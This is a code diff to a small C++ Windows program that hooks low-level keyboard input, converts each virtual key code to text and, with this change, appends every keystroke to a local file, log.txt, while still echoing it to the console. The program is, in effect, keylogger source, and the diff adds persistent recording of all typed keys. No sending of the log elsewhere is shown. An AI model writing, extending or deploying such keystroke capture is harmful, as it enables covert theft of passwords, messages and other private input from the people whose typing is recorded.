@@ -1,7 +1,10 @@
 #include <iostream>
+#include <fstream>
 #include <windows.h>
 
 using namespace std;
+
+#define FILEPATH "log.txt"
 
 string ConvertVkCode(DWORD vkCode) {
     string convertedKeyInput;
@@ -179,7 +182,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         DWORD vkCode = press->vkCode; // Get the virtual keycode
         if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
         {
-            cout << ConvertVkCode(vkCode) << endl;
+            ofstream file(FILEPATH, std::ios_base::app);
+            if (file.is_open())
+            {
+                file << ConvertVkCode(vkCode) << "\n";
+                file.close();
+            }
+            else
+            {
+                cout << "Unable to open the log file.\n";
+            }
+            cout << ConvertVkCode(vkCode) << "\n";
         }
     }
     return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
